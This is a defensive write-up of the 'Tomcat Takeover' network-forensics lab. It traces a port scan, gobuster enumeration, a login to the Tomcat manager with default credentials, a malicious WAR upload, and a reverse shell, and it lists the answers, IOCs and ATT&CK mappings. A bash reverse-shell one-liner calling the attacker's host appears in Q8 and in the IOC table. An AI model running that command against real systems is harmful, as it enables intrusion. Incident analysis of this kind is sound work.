# Tomcat Takeover Lab Write-Up: Network Traffic Analysis & Incident Investigation

## **Lab Overview**
- **Platform**: CyberDefenders
- **Lab Name**: Tomcat Takeover
- **Category**: Network Forensics
- **Tactics**: Reconnaissance, Execution, Persistence, Privilege Escalation, Credential Access, Discovery, Command and Control
- **Tools Used**: Wireshark
- **Difficulty**: Easy
- **Scenario**: The SOC team identified suspicious activity on an internal Apache Tomcat web server. Network traffic was captured for analysis. Your task is to analyze the PCAP file to understand the scope of the attack, including scanning, enumeration, credential brute‑forcing, file upload, and persistence mechanisms.

---

## **Initial Observations**
- The Tomcat server is on an **internal network** (not public), making any external communication highly suspicious.
- Before diving into the questions, a quick look at **Statistics → Conversations** (IPv4) reveals:
  - An external IP `14.0.0.120` communicating with the internal server.
  - High packet count (>2 MB) and over 9000 TCP connections from this IP – strong indicators of scanning activity.
  - Many different destination ports from the same source, confirming a port scan.
<img width="975" height="520" alt="image" src="https://github.com/user-attachments/assets/d586bec6-4f15-49f2-b748-d12131b26d95" />

<img width="975" height="491" alt="image" src="https://github.com/user-attachments/assets/042bc074-bdf8-4064-afd4-04b002f2d438" />


> *Figure 1: IPv4 Conversations showing attacker IP 14.0.0.120 with high traffic volume.*

---

## **Investigation Steps & Answers**

### **Q1: Attacker’s Source IP**
**Question:** Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?

**Method:**
- Open the PCAP in Wireshark.
- Navigate to **Statistics → Conversations** → **IPv4** tab.
- Observe the IP with the most conversations and bytes.

**Answer:** `14.0.0.120`


<img width="975" height="475" alt="image" src="https://github.com/user-attachments/assets/6f661eda-c013-45a0-b575-92116ee59a50" />


> *Figure 2: Conversations tab highlighting 14.0.0.120 as the top talker.*

---

### **Q2: Attacker’s Country of Origin**
**Question:** Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?

**Method:**
- Use a threat intelligence platform like **AbuseIPDB** or any GeoIP lookup.
- Enter the IP `14.0.0.120`.

**Findings:**
- **Country:** China
- Associated domain: `chinatelecom.cn`

**Answer:** `China`


<img width="975" height="461" alt="image" src="https://github.com/user-attachments/assets/bebabca0-279f-4199-8496-951af6b9d88b" />


> *Figure 3: AbuseIPDB lookup results for 14.0.0.120.*

---

### **Q3: Open Port Providing Access to Admin Panel**
**Question:** From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?

**Method:**
- Filter for successful TCP handshakes from the attacker to the server, indicating open ports:
  ```
  ip.addr == 14.0.0.120 && tcp.flags.syn == 1 && tcp.flags.ack == 1
  ```
- This filter shows SYN-ACK packets, confirming ports that responded.

**Observation:**
- Among the ports that completed a three‑way handshake, **port 8080** is a common Tomcat admin port.

**Answer:** `8080`


<img width="975" height="461" alt="image" src="https://github.com/user-attachments/assets/0ed17acb-fd02-4038-bb6c-8e2b4e64ea1d" />


> *Figure 4: Filter showing SYN-ACK packets for port 8080.*

---

### **Q4: Tool Used for Directory Enumeration**
**Question:** Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?

**Method:**
- Filter HTTP requests from the attacker:
  ```
  ip.src == 14.0.0.120 && http
  ```
- Examine the **User-Agent** strings or request patterns.

**Observation:**
- Many requests show a pattern consistent with directory brute‑forcing tools.
- The User‑Agent reveals `gobuster` – a popular directory/file enumeration tool.

**Answer:** `gobuster`


<img width="975" height="523" alt="image" src="https://github.com/user-attachments/assets/990b1c35-164e-47bc-a321-e3d111dc6b9b" />


> *Figure 5: HTTP requests showing gobuster User-Agent.*

---

### **Q5: Admin Panel Directory Discovered**
**Question:** After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?

**Method:**
- The attacker would eventually find the admin panel and likely attempt a file upload (POST method).
- Filter for POST requests from the attacker:
  ```
  ip.addr == 14.0.0.120 && http.request.method == "POST"
  ```
- Only one POST packet appears.

**Analysis:**
- The request URI is **`/manager/html/`** – the default Tomcat admin application deployment interface.

**Answer:** `/manager/html/` (or simply `/manager` – the lab accepts `/manager`; we report the exact path found)


<img width="975" height="458" alt="image" src="https://github.com/user-attachments/assets/8d562b5e-eb54-41dd-86d8-670101640393" />


> *Figure 6: POST request to /manager/html/.*

---

### **Q6: Successfully Brute‑Forced Credentials**
**Question:** After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct username and password that the attacker successfully used for login?

**Method:**
- In the same POST packet (or in preceding authentication attempts), look for the **Authorization** header.
- The Authorization header contains Base64‑encoded credentials.

**Decoding:**
- Locate the header: `Authorization: Basic YWRtaW46dG9tY2F0`
- Decode from Base64 (e.g., using an online decoder or command line):
  ```
  echo "YWRtaW46dG9tY2F0" | base64 -d
  ```
- Result: `admin:tomcat`

**Answer:** `admin:tomcat`


<img width="975" height="446" alt="image" src="https://github.com/user-attachments/assets/ebbe5367-b82a-4295-aefe-63adf74192f2" />

> *Figure 7: Authorization header in HTTP request.*


<img width="975" height="383" alt="image" src="https://github.com/user-attachments/assets/c1c4609a-c0f7-481f-8005-90eec2697276" />

> *Figure 8: Base64 decoded credentials.*

---

### **Q7: Malicious File Uploaded for Reverse Shell**
**Question:** Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?

**Method:**
- The file upload occurs via the `/manager/html/` interface, typically using a PUT or POST with multipart/form-data.
- In the same packet or subsequent ones, look for the filename parameter.
- Using Wireshark’s **Find Packet** feature, search for the string `name=` or `.war`.

**Observation:**
- The uploaded file is named **`JXQOZY.war`** (a Java web application archive, often used to deploy a reverse shell on Tomcat).

**Answer:** `JXQOZY.war`


<img width="975" height="512" alt="image" src="https://github.com/user-attachments/assets/30de9c48-1af8-4768-95c9-8aa78dfd0d0e" />


> *Figure 9: HTTP request showing the uploaded filename.*

---

### **Q8: Persistence Command Scheduled by Attacker**
**Question:** After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?

**Method:**
- After the reverse shell is established, the attacker may send commands over a TCP stream.
- Filter for traffic from the attacker to the server after the shell is active. One approach: look for packets with the PUSH flag:
  ```
  ip.src == 14.0.0.120 && tcp.flags.push == 1
  ```
- Follow the TCP stream of the first such packet to view the command.

**Analysis:**
- The stream reveals a reverse shell command:
  ```
  /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
  ```
- This command uses bash to create an interactive shell connecting back to the attacker's IP on port 443, ensuring persistent access.

**Answer:** `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`

<img width="975" height="91" alt="image" src="https://github.com/user-attachments/assets/e55062ce-0000-4b90-89ab-74c490534884" />


<img width="975" height="635" alt="image" src="https://github.com/user-attachments/assets/387a6565-da5a-4325-992c-3d16095c9822" />

> *Figure 10: TCP stream containing the persistence command.*

---
## **Answers**

<img width="576" height="602" alt="image" src="https://github.com/user-attachments/assets/76cd9c86-9d26-4bec-a587-76e7173bf3de" />

<img width="975" height="937" alt="image" src="https://github.com/user-attachments/assets/fd899abc-8566-43c2-a2a0-175781b33881" />

---
## **Cogratulations**

<img width="975" height="431" alt="image" src="https://github.com/user-attachments/assets/fb75c13a-e4fb-4a0c-9fab-5aa4a4df0ded" />


---

## **Indicators of Compromise (IOCs)**

| Type | Value |
|------|-------|
| Attacker IP | 14.0.0.120 |
| Country of Origin | China |
| Open Admin Port | 8080 |
| Enumeration Tool | gobuster |
| Admin Panel Path | /manager/html/ |
| Compromised Credentials | admin:tomcat |
| Malicious File | JXQOZY.war |
| Persistence Command | `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'` |

---

## **MITRE ATT&CK Mapping**

| Tactic | Technique | ID |
|--------|-----------|----|
| **Reconnaissance** | Active Scanning: Port Scanning | T1595.001 |
| **Discovery** | File and Directory Discovery | T1083 |
| **Credential Access** | Brute Force | T1110 |
| **Execution** | Command and Scripting Interpreter | T1059 |
| **Persistence** | Scheduled Task/Job | T1053 |
| **Command and Control** | Non‑Standard Port | T1571 |
| **Exfiltration** (implied) | Data Encrypted | T1048 |

---

## **Conclusion**

The investigation of the Tomcat server PCAP reveals a full attack chain:
1. **Reconnaissance**: Attacker IP `14.0.0.120` performed a port scan, identifying open port 8080 (Tomcat admin).
2. **Enumeration**: Using `gobuster`, the attacker discovered the `/manager/html/` admin panel.
3. **Credential Access**: Brute‑forcing yielded valid credentials `admin:tomcat`.
4. **Execution**: The attacker uploaded a malicious WAR file (`JXQOZY.war`) to establish a reverse shell.
5. **Persistence**: A scheduled bash command maintained access by connecting back to the attacker on port 443.

These findings provide actionable IOCs and highlight the importance of securing administrative interfaces, using strong credentials, and monitoring for unusual outbound connections.

---

## **Tools Used**
- **Wireshark**: Filtering, conversation statistics, TCP stream following, packet inspection.
- **AbuseIPDB**: GeoIP and threat intelligence lookup.
- **Base64 Decoder**: For extracting credentials.

---

## **References**
- CyberDefenders.org – Tomcat Takeover Lab
- MITRE ATT&CK® Framework
- Apache Tomcat documentation

---

